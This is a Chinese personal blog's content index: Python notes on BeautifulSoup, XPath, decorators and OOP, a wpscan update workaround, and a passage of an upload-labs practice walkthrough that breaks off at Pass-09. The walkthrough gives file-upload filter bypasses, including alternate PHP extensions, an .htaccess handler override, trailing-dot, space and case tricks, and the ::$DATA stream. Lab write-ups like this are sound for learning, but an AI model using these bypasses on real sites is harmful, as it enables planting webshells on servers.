True:可以匹配任何值,下面代码查找到所有的`一级`tag\nfor tag in soup.find_all(True):\n   print(tag.name)\n\n# limit 显示返回数量\nsoup.find_all(\"a\", limit=2)\n\n# 只搜索tag的直接子节点,\nsoup.html.find_all(\"title\", recursive=False)\n```\n\n```python\ndef test(tag):  #包含 class 属性却不包含 id 属性\n   return tag.has_attr('class') and not tag.has_attr('id')\n\n# 调用\nsoup.find_all(test)\n```\n\n\n\n```python\n#下面两行代码是等价的\nsoup.find_all('div', limit=1)\n\nsoup.find('div')\n\n```\n\n> **区别**:find_all() 方法的返回结果是值包含一个元素的列表,而 find() 方法直接返回结果.find_all() 方法没有找到目标是返回空列表, find() 方法找不到目标时,返回 None\n\n\n\n\n\n\n\n###### NavigableString\n\n可遍历字符串\n\n通过 `unicode()` 方法可以直接将 `NavigableString` 对象转换成Unicode字符串:\n\n```python\nunicode_string = unicode(tag.string)\n```\n\n\n\n\n\n###### BeautifulSoup\n\n表示的是一个文档的全部内容,可以把它当作 `Tag` 对象，是一个特殊的 Tag，我们可以分别获取它的类型，名称，以及属性。\n\n\n\n###### Comment\n\n```python\nhtml_doc='<a href=\"http://z.com\" class=\"row\" id=\"box\"><!-- hhh --></a>'\n\nsoup = BeautifulSoup(html_doc, 'html.parser')\n\nprint(soup.a.string)   # hhh\nprint(type(soup.a.string))  #  <class 'bs4.element.Comment'>\n\n\"\"\"\na 标签里的内容实际上是注释，但是如果我们利用 .string 来输出它的内容，我们发现它已经把注释符号去掉了，所以这可能会给我们带来不必要的麻烦。\n\"\"\"\n# 在使用前最好做一下判断\nif type(soup.a.string)==bs4.element.Comment:\n    print soup.a.string\n```\n\n\n\n\n\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["Beautifulsoup"],"categories":["Python"]},{"title":"python-XPath","url":"%2Fposts%2F12481%2F","content":"\n\n  \n###### XPath\n\nXPath，全称 XML Path Language，即 XML 路径语言，它是一门在 XML 文档中查找信息的语言。最初是用来搜寻 XML 文档的，但同样适用于 HTML 文档的搜索。所以在做爬虫时完全可以使用 XPath 做相应的信息抽取。\n  \n\n\n\n  \n### python库lxml的安装\n\n```bash\npip3 install lxml\n```\n\n\n  \n### XPath常用规则\n\n| 表达式            | 描述                                       |\n| ----------------- | ------------------------------------------ |\n| nodename          | 选取此节点的所有子节点                     |\n| /                 | 从当前节点选取直接子节点                   |\n| //                | 从当前节点选取子孙节点                     |\n| .                 | 选取当前节点                               |\n| ..                | 选取当前节点的父节点                       |\n| @                 | 选取属性                                   |\n| *                 | 通配符，选择所有元素节点与元素名           |\n| @*                | 选取所有属性                               |\n| [@attrib]         | 选取具有给定属性的所有元素                 |\n| [@attrib='value'] | 选取给定属性具有给定值的所有元素           |\n| [tag]             | 选取所有具有指定元素的直接子节点           |\n| [tag='text']      | 选取所有具有指定元素并且文本内容是text节点 |\n\n\n\n### XPath中的运算符\n\n| 运算符 | 描述             | 实例              | 返回值                                         |\n| ------ | ---------------- | ----------------- | ---------------------------------------------- |\n| or     | 或               | age=19 or age=20  | 如果age等于19或者等于20则返回true反正返回false |\n| and    | 与               | age>19 and age<21 | 如果age等于20则返回true，否则返回false         |\n| mod    | 取余             | 5 mod 2           | 1                                              |\n| \\|     | 取两个节点的集合 | //book \\| //cd    | 返回所有拥有book和cd元素的节点集合             |\n| +      | 加               | 6+4               | 10                                             |\n| -      | 减               | 6-4               | 2                                              |\n| *      | 乘               | 6*4               | 24                                             |\n| div    | 除法             | 8 div 4           | 2                                              |\n| =      | 等于             | age=19            | true                                           |\n| !=     | 不等于           | age!=19           | true                                           |\n| <      | 小于             | age<19            | true                                           |\n| <=     | 小于或等于       | age<=19           | true                                           |\n| >      | 大于             | age>19            | true                                           |\n| >=     | 大于或等于       | age>=19           | true                                           |\n\n\n\n\n\n\n\n\n\n### 解析方式\n\n```python\nfrom lxml import etree\n\ntext='''\n<div>\n    <ul>\n         <li class=\"item-0\"><a href=\"link1.html\">第一个</a></li>\n         <li class=\"item-1\"><a href=\"link2.html\">second item</a></li>\n         <li class=\"item-0\"><a href=\"link5.html\">a属性</a>\n     </ul>\n </div>\n'''\n\n# 1.读取文本解析节点\nhtml=etree.HTML(text) #初始化生成一个XPath解析对象\nresult=etree.tostring(html,encoding='utf-8')   #解析对象输出代码\n\n\n# 2.读取HTML文件进行解析\nhtml=etree.parse('test.html',etree.HTMLParser()) #指定解析器HTMLParser会根据文件修复HTML文件中缺失的如声明信息\nresult=etree.tostring(html)   #解析成字节\n#result=etree.tostringlist(html) #解析成列表\n\n\n\n\n```\n\n\n\n#### 获取元素节点\n\n```python\n# 1.获取所有节点             //\nfrom lxml import etree\n\nhtml=etree.parse('test.html',etree.HTMLParser())\nresult=html.xpath('//*')  #//代表获取子孙节点，*代表获取所有\n\n# 如要获取li节点，可以使用//后面加上节点名称，然后调用xpath()方法\nhtml.xpath('//li')   #获取所有子孙节点的li节点\n\n\n\n# 2.获取子节点            /\nresult=html.xpath('//li/a')  #通过追加/a选择所有li节点的所有直接a节点，因为//li用于选中所有li节点，/a用于选中li节点的`所有直接子节点a`\n\n\n\n# 3.获取父节点       ..           parent::\n# 使用`..`来实现也可以使用`parent::`来获取父节点\nhtml=etree.HTML(text, etree.HTMLParser())\nresult=html.xpath('//a[@href=\"link2.html\"]/../@class')\nresult1=html.xpath('//a[@href=\"link2.html\"]/parent::*/@class'\n\n                   \n                   \n# 4.根据属性匹配节点             //div[@class='box']\nhtml=etree.HTML(text, etree.HTMLParser())\nresult=html.xpath('//li[@class=\"item-1\"]')\nprint(result)                \n\n\n                   \n# 5.获取节点中的文本       text()\nhtml=etree.HTML(text,etree.HTMLParser())\nresult=html.xpath('//li[@class=\"item-1\"]/a/text()') #获取a节点下的内容\nresult1=html.xpath('//li[@class=\"item-1\"]//text()') #获取li下所有子孙节点的内容           \n                   \n                   \n                   \n# 6. 获取属性               @href, @class,  @src\nresult=html.xpath('//li/a/@href')  #获取a的href属性\nresult=html.xpath('//li//@href')   #获取所有li子孙节点的href属性\n                   \n                   \n# 7. 属性多值匹配节点(某个属性的值有多个时，一个节点有多个属性值)     \tcontains()\ntext1='''\n<div>\n    <ul>\n         <li class=\"aaa item-0\"><a href=\"link1.html\">第一个</a></li>\n         <li class=\"bbb item-1\"><a href=\"link2.html\">second item</a></li>\n     </ul>\n </div>\n'''\n\nhtml=etree.HTML(text1,etree.HTMLParser())\nresult1=html.xpath('//li[contains(@class,\"aaa\")]/a/text()')              \n                   \n                   \n\n# 8.多属性匹配（根据多个属性确定一个节点， 多个节点有相同的属性值）      and\ntext1='''\n<div>\n    <ul>\n         <li class=\"aaa\" name=\"item\"><a href=\"link1.html\">第一个</a></li>\n         <li class=\"aaa\" name=\"fore\"><a href=\"link2.html\">second item</a></li>\n     </ul>\n </div>\n'''\n\nhtml=etree.HTML(text1,etree.HTMLParser())\nresult=html.xpath('//li[@class=\"aaa\" and @name=\"fore\"]/a/text()')\nresult1=html.xpath('//li[contains(@class,\"aaa\") and @name=\"fore\"]/a/text()')\n \n                   \n\n                   \n# 9. 按序选择\n# 可能同时匹配多个节点，但我们只想要其中的某个节点，如第二个节点或者最后一个节点，这时可以利用中括号引入索引的方法获取特定次序的节点：   [1], [last()],    position()\nresult=html.xpath('//li[contains(@class,\"aaa\")]/a/text()') #获取所有li节点下a节点的内容\nresult1=html.xpath('//li[1][contains(@class,\"aaa\")]/a/text()') #获取第一个\nresult2=html.xpath('//li[last()][contains(@class,\"aaa\")]/a/text()') #获取最后一个\nresult3=html.xpath('//li[position()>2 and position()<4][contains(@class,\"aaa\")]/a/text()') #获取第三个\nresult4=html.xpath('//li[last()-2][contains(@class,\"aaa\")]/a/text()') #获取倒数第三个\n# XPath的函数： http://www.w3school.com.cn/xpath/xpath_functions.asp\n        \n                   \n                   \n# 10. 节点轴选择\n# 包括获取子元素、兄弟元素、父元素、祖先元素等        \nresult=html.xpath('//li[1]/ancestor::*')  #获取所有祖先节点\nresult1=html.xpath('//li[1]/ancestor::div')  #获取div祖先节点\nresult2=html.xpath('//li[1]/attribute::*')  #获取所有属性值\nresult3=html.xpath('//li[1]/child::*')  #获取所有直接子节点\nresult4=html.xpath('//li[1]/descendant::a')  #获取所有子孙节点的a节点\nresult5=html.xpath('//li[1]/following::*')  #获取当前子节之后的所有节点\nresult6=html.xpath('//li[1]/following-sibling::*')  #获取当前节点的所有同级节点            \n# 更多轴的用法可参考：http://www.w3school.com.cn/xpath/xpath_axes.asp             \n                   \n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n> 本文参考：https://www.cnblogs.com/zhangxinqi/p/9210211.html        博主写的很详细，也很美观\n\n> XPath的更多用法参考：http://www.w3school.com.cn/xpath/index.asp\n\n> python lxml库的更多用法参考：http://lxml.de/\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["XPath"],"categories":["Python"]},{"title":"python基础-装饰器","url":"%2Fposts%2F6b278895%2F","content":"\n  \n\n\n  \n###### 装饰器\n\n```python\n###函数的装饰器,本质上就是一个闭包\n## 概括的讲，装饰器的作用就是为已经存在的对象添加额外的功能。\ndef  f1(func):\n    print('f1 runing')\n    def f2(y):\n        print('f2 running')\n        return  func(y) +1\n    return f2\n\n@f1    #装饰器 (@符号加函数名,装饰上了gun函数)   #相当于f1(gun)\ndef gun(m):\n    print('gun runing')\n    return m*m\n\n## @f1  ->   f1( gun) -> f2\nn=gun(5)    #   gun(5) -> 就是在运行  f2(5)\nprint(n)\n\n\n#############例子:\nimport time\ndef run_time(func):\n    def new_fun(*args,**kwargs):\n        t0 = time.time()\n        print('star time: %s'%(time.strftime('%X',time.localtime())) )\n        back = func(*args,**kwargs)\n        print('end time: %s'%(time.strftime('%X',time.localtime())) )\n        print('run time: %s'%(time.time() - t0))\n        return back\n    return new_fun\n\n\n@run_time\ndef test2(n):\n    for i in range(1,n):\n        for j in range(1,i+1):\n            print('%dx%d=%2s'%(j,i,i*j),end = ' ')\n        print ()\n#@run_time -> run_time(test2)  -> new_fun\nn = test2(10)  #就相当于运行new_time(5)\n```\n\n###### 例子\n\n```python\n# 写一个login函数  然后写一个装饰器，模拟登录过程：让程序延迟3秒 在延迟过程中输出正在验证\n\"\"\"\ndef login():\n    print('登录成功')\n\"\"\"\nimport time\n\ndef login_required(func):\n    def wrpper(*args,**kwargs):\n        print('正在验证...')\n        time.sleep(5)\n        return func(*args,**kwargs)\n    return wrpper\n\n@login_required\ndef login():\n    print('登录成功')\n   #return  'code:200'\n\nlogin()\n```\n\n\n\n##### 类作为装饰器\n\n```python\n## 用__call__方法\n\nclass Tset_Class():\n    def __init__(self,func):  # 传进来函数\n        print('正在实例化')\n        self.func = func\n    def __call__(self, *args, **kwargs):   #类装饰器, 一定要写__call__方法\n        print('这是call方法')\n        return self.func\n\n@Tset_Class\ndef  test():\n    print('这是一个测试函数')\n\nn =  test()   #    self.func : test 函数体\nn()           #   n()  调用test（）\n\n#  1.  @Tset_Class  ：  Tset_Class( test )  -> 相当于：t = Tset_Class( test )\n#  2.  test()  ->  相当于：   调用实例的call方法 -> 返回 self.func函数体\n#  3.  n =  test()   ，n()  调用test（）\n```\n\n\n\n###### 类中常见的几种装饰器\n\n```python\nclass Test():\n    aa = 123\n\n    def __init__(self,name):\n        self.__name = name\n\n    @property  # 把方法变成属性\n    def get_name(self):\n        print( self.__name)\n        return  self.__name\n\n    @get_name.setter   # 可以让get方法，变成set方法\n    def get_name(self,name):\n        self.__name = name\n\n    @property  # 把方法变成属性\n    def po(self):\n        print('asdfasdfasdfasdaf')\n\n    @staticmethod\n    def test():\n        print('staticmethod  func')\n\n    @classmethod\n    def show(cls):\n        print(cls.aa)  # 可以访问类属性\n        print('classmethod func ')\n\nt = Test('jianeng')\n\nt.show()\n# @property\n# t.get_name = 4   # get_name.setter 没有写的时候， = 4 会报错\n# t.get_name\n# t.po\n\n\n# @staticmethod     #没有self\nt.test()   # 没有self  ，实例不能调用。\nTest.test()  # 类名可以直接调用\n\n\n###  @classmethod    #类方法, 一般是用来做封装  class名字已经传进去了\nTest.show()  #有self， 类名不能直接调用\nt.show()\n##静态方法装饰器： staticmethod    类调用与实例调用无差别， 也不需要self参数，类似于普通函数   不需实例化就可以调用,直接用类名调用   （与实例解绑）， 不能访问其他的类属性与方法（相当于类的方法）\n\n##类方法装饰器： classmethod        self参数被换成cls参数， 自动传入对应的类  可以访问类属性与其他类方法\n```","tags":["装饰器"],"categories":["Python"]},{"title":"python基础-闭包","url":"%2Fposts%2F1c7bab7f%2F","content":"\n\n\n\n  \n```python\n# 闭包:   一个函数里面嵌套一个函数,调用外层函数返回里层函数本身\n#1.\ndef fx(x):\n    x+=1\n    def fy(y):\n        return  x*y\n    return  fy     #不要加括号\n\nf=fx(5)      #拿到fy的函数体\nn = f(5)      #fy()\nprint(n)\n\n\n#2.传进去的参数为函数体\ndef  f1(func):\n    print('f1 runing')\n    def f2(y):\n        print('f2 running')\n        return  func(y) +1\n    return f2\n\ndef gun(m):\n    print('gun runing')\n    return m*m\n\ntemp =  f1(gun)   # 返回f2函数体   # f1 runing  -> f2  ->temp\nn= temp( 5)     # f2( 5)  ->  ' f2 running '  -> return  func(y) +1\n            #  func(y) ===  gun(m) -> gun runing   ->  5*5\n            #  return  25 +1  -> 26\n\nprint(n)\n\n```\n\n","tags":["闭包"],"categories":["Python"]},{"title":"python面向对象-继承小小例子","url":"%2Fposts%2Fe211efc6%2F","content":"\n\n\n\n  \n用之前学习笔记的小例子来复习一下\n\n```python\n############################继承\n#父类里面有的,子类里面再写一次. 叫做重写 ,只会用子类的了,父类的就屏蔽了\n#继承是通过查找来找的,  不是变量空间的复制,  还是独立的变量空间\n#  多继承     既不是广度也不是深度搜索   .   mro() 方法,是在类里面的,他会自己计算出搜索顺序   例如: print(Magician.mro())或print(Magician.__mro__)  或者 print(s.__class__.mro())\n#   [<class '__main__.Magician'>, <class '__main__.Role'>, <class 'object'>]\n#  super  自己找父类, 如果父类改变,也不需要修改,哪怕父类被更换，也不用担心了！   super不需要再传self ,super是通过mro查找的\n\n#__bases__特殊属性     print(Role.__bases__)     打印出来是一个元组 (<class 'object'>,)\n#实例+()  自动调用__call__方法\nclass Role:\n    def __init__(self,name,level,blood):    # 在实例化之后自动被调用,用来进行初始化\n        self.name = name\n        self.level = level\n        self.blood = blood\n\n    def __repr__(self):\n        return \"{cls}:{name},{level},{blood}\".format(cls=self.__class__.__name__,\n                                                          name=self.name,\n                                                          level=self.level,\n                                                          blood=self.blood )\n\n    def figth(self):\n        raise NotImplementedError('必须在子类中实现该行为')\n\n\nclass SwordsMan(Role):    #继承了Role类\n    def __init__(self,name,level,blood,attack_power):    #重写了__init__\n         #Role.__init__(self,name,level,blood)\n         super().__init__(name, level, blood)   #不在明确指定类名\n         self.attack_power = attack_power\n\n    def fight(self):\n        print('物理攻击')\n\nclass Magician(Role):     #继承自Role\n    def __init__(self,name,level,blood,magical_power):              #重写了__init__\n        #Role.__init__(self,name,level,blood)\n        super().__init__(name, level, blood)  # 不在明确指定类名\n        self.magical_power = magical_power\n\n    def fight(self):\n        print('魔法攻击')\n\n    def cure(self):\n        print('治疗')\n\n\n## 鸭子类型\n#展示出攻击的效果(这件事,不属于任何一个角色)\n#写出一个函数\ndef draw_fight(role):    # 鸭子类型体现出来是,一个函数,所关心的不是类型,而是行为\n    print('role', end='')\n    role.fight()  # 其实并不关心,role是不是一个role实例\n\nclass GirlFriend:    #虽然没有继承Role类,依然可以用鸭子类型\n    def __init__(self,name):\n        self.name = name\n\n    def fight(self):\n        print('拔电源攻击')\n\ng = GirlFriend('xxx')\ndraw_fight(g)    #打印出role拔电源攻击\n\ns= SwordsMan('xps',18,3000,150)   #实例化\nm = Magician('ps',18,1400,6660)\ndraw_fight(s)   #打印出 role物理攻击\ndraw_fight(m)   #打印出 role魔法攻击\n\nprint(s)\nprint(m.__repr__())\n\n\n\n\n\nprint('***********************************************************')\n# 继承是通过查找来找的,  不是变量空间的复制,  而是独立的变量空间\nclass BaseClass:\n    attribute = 1\n\n    def method(self):\n        pass\n\nclass DerivedClass:    # 简单继承,没有任何的封装与重写\n    pass\n\nprint(DerivedClass.__dict__)   # DerivedClass中没有 attribute 与 method\nprint(BaseClass.__dict__)     # BaseClass中有\nprint(Magician.__mro__)\nprint(s.__class__.mro())\n\n```\n\n","tags":["继承"],"categories":["Python"]},{"title":"python面向对象小例子","url":"%2Fposts%2F4cceafcb%2F","content":"\n\n  \n用一个银行存款取款的例子来回忆一下面向对象最基础的部分\n\n```python\n\nclass Account:\n    all_count={}   #类属性\n    def __init__(self, name, number, balance):  # 初始化账户的'实例方法',见名知意\n        self.name = name\n        self.number = number  # 实例的变量属性\n        self.balance = balance\n        self.all_count[self.number] = self   #\n\n    # def __del__(self):  #当实例对象被销毁的时候,当变量的指向为0的时候  自动触发\n    #     print(self.name,'被销毁了')\n\n\n    def deposit(self, amount):  # 存款\n        if amount <= 0:\n            print('存款金额不得为负')\n        else:\n            self.balance += amount\n\n    def withdraw(self, amount):  # 取款\n        if amount > self.balance:\n            print('余额不足')\n        else:\n            self.balance -= amount\n\n    def describe(self):  # 查询账户详情\n        return \"Account(姓名:{name},账户:{number},余额:{balance})\".format(name=self.name,\n                                                           number=self.number,\n                                                           balance=self.balance)\n    def close(self):\n        self.all_count.pop(self.number)\n\n\na=Account('xps','6217',10000)\nv = getattr(a,'nme','000')\n# b = a\n# del a\nprint(v)\n# a.deposit(5000)\n# a.withdraw(2500)\n# print(a.describe())\n#\n# print(a.__dict__)\n# print(__name__)\n\n############################################ 笔记 #######################################3\n#__init__()    在实例化之后自动被调用,用来进行初始化\n#__del__()      删除变量的指向,不是直接去删除这个对象  例如:a=[1,2,3]  b=a   del a   a变量没了,但是b还存在\n                #程序执行完之后变量的内存自动释放.自动触发  __del__\n\n#__str__()     #str 会自动触发    对用户友好   后面可以直接 print(a) 来输出str的值,如果没有定义a,则输出repr的值\n#__repr__()    repr会自动触发     对开发者友好     在控制台shell 直接 a  输出repr的值  ,如果repr没有定义,则不会找str\n\n#getattr()      getattr(i,'name','没有') 相当于转换成对象的访问 obj.name  获取,,和字典里面的get()方法类似,找不到返回'没有'   'name'这里是一个字符串\n#hasattr()      hasattr(i,'xxx')  返回布尔值 (还可以避免因为属性没有而产生报错)   'xxx'也是字符串       hasattr 还可以避免，因为属性没有，而导致的报错\n\n\n#setattr()      setattr(i,'name','vvv'')  自动转换成i.name = 'vvv'         'name'这里是一个字符串\n#delattr()      delattr(i,'name')     删除                                   'name'这里是一个字符串    转化成del i.name\n\n#__class__      可以得到一个类实例所属的类对象,print(a.__class__)   <class '__main__.Account'>   不是类名\n#__doc__       注释文档写了之后,可以help出来   如:print(help(Account))\n                #  注释存储在了__doc__里   如: print(Account.__doc__)可以打印其文档注释\n\n#__dict__      一个存储了对象属性的字典 把该变量空间的打印出来\n                #  例:print(a.__dict__)  >>{'balance': 12500, 'name': 'xps', 'number': '6217'}\n                #类也可以   print(Account.__dict__)\n#__name__\n\ndef dance():\n    pass\nprint(dance.__name__)     #可以查看该函数的名字\n\nclass C:\n    pass\nprint(C.__name__)         #可以查看该类的名字\n\n#类名  是一个字符串\n\n#print 输出的是你给他的东西得  __str__\n\n#shell 里面  输出的是  你给他的东西的 __repr__\n\n#self   是实例本身\n# print 输出的str 但是如果输出一个数据结构(集合元组字典列表)的数据,里面的数据,会以repr展示\n\n\n########################################################################################\nif __name__ == '__main__':\n    pass\n\n\n\n#print(str(__name__))       __name__\n\n#import 的时候,会把那个文件执行一遍\n###如果作为一个模块被导入的话,就不会调用__name__以下的东西\n#  print(__name__)     结果为  __main__\n\n#######################################################闭包###########################33\nclass A:\n    def __del__(self):\n        print('被销毁0')\n\ndef outer():   #\n    a=A()  #a 是在函数调用时候实例化的\n    def inner():    #inner 也是在outer里面定义的,在outer结束的时候inner也被销毁\n        print(a)\n    return  inner\n\nx = outer()     #用一个变量去接受,就不会打印出来,inner获得一个临时指向\ndel x #销毁函数inner\n\n\n\n\n#1.构造局部的全局变量\n#2.在没有类的情况下,封装变量\n\n\ninput()\n\n\n\n######私有化,保护作用,类的外面访问不到\n_eye=2  # protect  隐藏  但是可print(dog._eye)访问.修改\n\n__leg=4    # 彻底保护.  万一访问的话,可以以下在外面访问(先定义一个方法):\ndef getLeg(self):     #获取私有属性\n    return self.__leg\nleg = dog.getLeg()\nprint(leg)     #可通过此方法在类外面查看\n\n###如果是修改私有属性的话:\ndef setLeg(self,leg):    #设置\n    self.__leg = leg\ndog.setLeg(55)    #修改私有属性\nprint(dog.getLeg())   #用get 方法来查看一下\n\n\n```\n\n","tags":["Python"],"categories":["Python"]},{"title":"wpscan更新超时报错","url":"%2Fposts%2F5366e554%2F","content":"\n\n\n> https://blog.csdn.net/zhang644720213/article/details/92849717\n\n参考自：https://blog.csdn.net/zhang644720213/article/details/92849717\n\n\n\n\n  \n先更新一下系统的索引\n`updatedb`\n\n查看文件\n`dpkg -L wpscan`\n\n下载需要的包（感谢大佬提供）:\n`wget https://files.cnblogs.com/files/despotic/wp.zip`\n\n\n放到本地apache的目录下：\n`mv wp.zip /var/www/html/wpscan/`\n\n解压：\n`unzip wp.zip`\n\n重启apache\n`/etc/init.d/apache2 restart`\n\n\n编辑配置文件：\n`vim /var/lib/gems/2.5.0/gems/wpscan-3.5.4/lib/wpscan/db/updater.rb`\n\n\n找到：`def remote_file_url`这个函数， 下面的服务器地址改为本地的目录`http://127.0.0.1/wpsaca/#{filename}`\n\n\n再运行`wpscan --upgrade`就可以了","tags":["WPscan"],"categories":["渗透测试"]},{"title":"upload-labs通关记录","url":"%2Fposts%2F3890b03c%2F","content":"\n\n\n本文主要记录一下`upload-labs`最新21关卡的过程，作为自己的一个笔记。\n\n> 靶场地址：https://github.com/c0ny1/upload-labs/\n\n  \n\n**ps：**\n\n\\- 为了快速验证效果，此处上传的webshell代码为`<php? phpinfo(); ?>`\n\n\\- 解题思路五花八门，我这里想起了啥就用啥。\n\n\\- 因为比较菜，所以做题直接看代码了就(谁料有的题目看了代码都看不懂)，哈哈哈。\n\n<img src=\"http://image.xpshuai.cn/20200218195326654_1642698147.png\" />\n\n## 相关函数\n\n```\ntrim()  去除空格\n\n\nstrrchr()查找字符串在另一个字符串中`最后一次`出现的位置，并返回从该位置到字符串结尾的所有字符。\n\nstrrchr(\"被查找的字符串\", \"出现的字符串\")\n\nstrstr() - 查找字符串的首次出现\n\nstrrpos() - 计算指定字符串在目标字符串中最后一次出现的位置\n\nstr_ireplace('要替换的对象','替换为','字符串')\n\n\ndeldot($file_name);//删除文件名末尾的点\n\n\n::$DATA ---> win上，会把`::$DATA`之后的数据当成文件流处理，不会检测后缀名，而且保持`::$DATA`之前的文件名（目的是不检查后缀名）\n\n\npathinfo(path,options)返回一个关联数组包含有 path 的信息。\n\n包括以下的数组元素：\n\n[dirname]\n\n[basename]\n\n[extension]\n\n\n第二个参数可能的值：\n\nPATHINFO_DIRNAME - 只返回 dirname\n\nPATHINFO_BASENAME - 只返回 basename\n\nPATHINFO_EXTENSION - 只返回 extension\n\n注释：如果不是要求取得所有单元，则 pathinfo() 函数返回字符串。\n\n\nintval() 函数用于获取变量的整数值。\n\n\n@uppack\n\n\n\n\n`rename()` 函数 ：重命名文件或目录。如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。rename(oldname,newname,context)\n\n\n```\n\n\n\n\n\n\n\n\n\n##  Pass-01\n\n> js验证\n\n点击上传文件之后，burp没有拦截到数据包，并且验证反应速度快\n\nF12查看代码后确认\n\n\n\n######  绕过\n\n**F1: **\n\n禁用js，直接上传php\n\n<img src=\"http://image.xpshuai.cn/20200217215459803_1606358356.png\" />\n\n成功：\n\n<img src=\"http://image.xpshuai.cn/20200217215605878_1982942629.png\" />\n\n\n\n**F2：**\n\n在本地创建html，action为服务器请求地址，（去掉相应js部分）\n\n**F3:**\n\n先把shell改为允许的类型,再bup中再改回来\n\n\n\n效果都是一样的\n\n\n\n\n\n## Pass-02\n\n> 服务端验证 -- 文件MIME类型\n\n\n\n只检测文件自带的类型\n\n<img src=\"http://image.xpshuai.cn/20200217215941532_643347454.png\" />\n\n\n\n\n\n##### 绕过：\n\nburp修改数据包中修改MIME类型（Content-Type）为允许的类型\n\n<img src=\"http://image.xpshuai.cn/20200217220124560_567357512.png\" />\n\n\n\n\n\n\n\n# Pass03-Pass10:      黑名单校验\n\n## Pass-03          \n\n> 服务端验证(黑名单方式) -- 多种格式后缀解析\n\n\n\n对上传的文件先过滤，后判断文件后缀，再随机命名\n\n<img src=\"http://image.xpshuai.cn/20200217220446232_1542284348.png\" />\n\n\n\n**比如：**         a.php\n\n先删掉文件名前后的空格\n\n删除末尾的点：  a.php\n\nstrrchr之后：      .php\n\n转换为小写：     .php\n\n去除字符串::$DATA\n\n再收尾去空格\n\n最后加上日期重命名\n\n\n\n\n\n###### 绕过\n\n> 前提:  `httpd-conf`文件中`AddType application/x-httpd-php` 没有被注释，而且有规定类型的文件\n\n对 phtml，php3，php4，php5，pht，htaccess没有进行过滤，那么利用这两种方法进行绕过。\n\n\n\n**补充:**\n\nasp:   asa, cer, cdx 等\n\njsp:   jspx, jspf\n\naspx:   ashx,asmx,ascx\n\n\n\n**准备工作：**\n\n修改httpd-conf配置文件,这里可以把php3等想要的文件后缀加上，再把注释符#去掉\n\n此类的正则表达式，文件名字满足即可在apache当做php解析。比如以下格式的文件：\n\nphp3，php4, php5, phtml，phps\n\n修改为： `AddType application/x-httpd-php .php .phtml .php3 .php4 .php5 .phps `\n\n**F1:  修改后缀名**\n\nburp拦截数据包，修改filename为`php3`,上传成功\n\n右键图片查看地址, 从这里可以得知上传的文件被重命名了,  打开图片地址，OK\n\n\n\n**F2:  上传图片马**\n\n上传图片马，然后利用BP拦截，将后缀名 `改为phtml,php3,php4,php5,pht`\n\n<img src=\"http://image.xpshuai.cn/20200218144512768_1843220897.png\" />\n\n\n\n  \n\n​    \n\n​    \n\n## Pass-04\n\n> 服务端（php5之类的也进行了过滤）\n\n\n\n<img src=\"http://image.xpshuai.cn/20200217222608134_260661208.png\" />\n\n\n\n但是没有过滤`.htaccess`，可以考虑重写文件解析规则绕过\n\n\n\ninfo.php.jpg.\n\n\n\n###### 绕过\n\n> 前提: apache搭建，  没有对上传文件重命名\n\n\n\n**.htaccess文件**\n\n1.先上传一个`.htaccess`文件，内容如下：\n\n```xml\n<FilesMatch \"jpg\">\n\nSetHandler application/x-httpd-php\n\n</FilesMatch>\n```\n\n\n\n2.然后再上传一个info.php, burp拦截数据包修改filename为`info.jpg`   / 或者直接上图片马， url访问图片路径，正常解析\n\n\n\n\n\n## Pass-05\n\n<img src=\"http://image.xpshuai.cn/20200217223711503_294591319.png\" />\n\n连.htaccess都放黑名单了\n\n\n\n**缺陷：**\n\n`strrchr函数`：  搜索参数在字符串中的位置，并返回从该位置到字符串结尾的所有字符\n\n如果有多个，匹配的是`最后一个`（这里并没有进行递归检测，前面的就会漏掉）\n\n如果是`a.php. jpg. `是不能正常解析的，但是`a.php.  .`就行\n\n\n\n###### 绕过：\n\n多写一个空格和点：上传文件 `info.php`， burp修改file为`info.php. .`\n\n**比如：**\n\n```\na.php.  .\n```\n\n去空：`a.php.  .`\n\n删除末尾点：`a.php.  `        最后一个点被deldot删除\n\n返回最后一个点的内容`. `       第二个strrchr匹配了第一个点和后面的空格\n\n前后去空：后缀为`.`, 不在黑名单范围，成功绕过\n\n最后上传文件名为：`a.php.`, 在windows保存文件的之后的`.`会消失\n\n\n\n如下图，win服务器保存的文件：\n\n<img src=\"http://image.xpshuai.cn/20200217224221081_348766282.png\" />\n\n\n\n正常解析：\n\n<img src=\"http://image.xpshuai.cn/20200217224244474_173158029.png\" />\n\n\n\n\n\n##  Pass-06\n\n<img src=\"http://image.xpshuai.cn/20200218145809732_1096167348.png\" />\n\n\n\n没有进行后缀名大小写转换\n\n\n\n\n\n###### 绕过\n\nburp修改filename后缀名为`.phP`，绕过检测，上传OK\n\n正常解析\n\n<img src=\"http://image.xpshuai.cn/20200218150044751_461792168.png\" />\n\n\n\n\n\n\n\n## Pass-07\n\n<img src=\"http://image.xpshuai.cn/20200218150316897_1558000982.png\" />\n\n\n\n最后没有将后缀首尾去空\n\n可以利用win文件名字保存格式的特性: 比如最后一个为空格`info.php `, \n\n`.php `不在黑名单`.php`等中，成功绕过，\n\n并且windows保存的时候会把最后的空格去除\n\n\n\n\n\n###### 绕过\n\nburp修改filename为`info.php `，后面加一个空格，上传\n\n\n\n\n\n## Pass-08\n\n<img src=\"http://image.xpshuai.cn/20200218151055198_961499757.png\" />\n\n\n\n少了提前删除文件名末尾的点 的功能(deldot)；\n\n`strrchr`过滤匹配的是最后一个点；\n\n没有对上传的文件重命名\n\n\n\n\n\n###### 绕过:\n\n**F1： 后缀名加点绕过**\n\nburp修改文件名，\n\n```\na.php.\n```\n\n`a.php. `可以带空格\n\n上传。\n\n\n\n**F2：利用Windows解析漏洞（后缀修改为1.php:1.jpg）**\n\n```\n1.php:1.jpg\n```\n\n没成功： 上传的是`1.php`，但是文件内容是空的了\n\n\n\n  \n\n​    \n\n​    \n\n## Pass-09\n\n> Windows文件流绕过\n\n\n\n<img src=\"http://image.xpshuai.cn/20200218152924608_961861669.png\" />\n\n\n\n少了 `$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA`    --> 含义：把后缀中是 ::DATA替换为空  